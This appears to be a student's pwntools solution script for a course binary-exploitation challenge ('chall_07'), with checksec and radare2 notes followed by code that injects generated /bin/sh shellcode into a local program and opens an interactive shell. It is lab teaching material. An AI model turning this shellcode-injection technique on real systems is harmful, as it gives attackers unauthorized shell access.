'''
Creators:       Malachi Parks
Section:        CPEG476-010
Assignment:     Project 2 --- chall_07
File Description:  Shellcode only since no other functions

Checksec info:
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE
Full RELRO      Canary found      NX disabled   PIE enabled     No RPATH   No RUNPATH   68) Symbols       No    0               1               chall_07

File info:
chall_07: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=ce0f32b229bbd5e1b175dfe30dc8ea215e8ad8f1, for GNU/Linux 3.2.0, not stripped

Radare2:
afl --> list all functions

r2 -Ad chall_07:
    No vuln or win function, looks like I can just execute shell code
    Not buff smashing since canary
'''

# Import Libaries
from pwn import *

# Create shellcode
context.arch="amd64"
shell=asm(shellcraft.sh())
payload=b''

# Create process and send payload
p=process("./chall_07")
payload+=shell
p.sendline(payload)
p.interactive()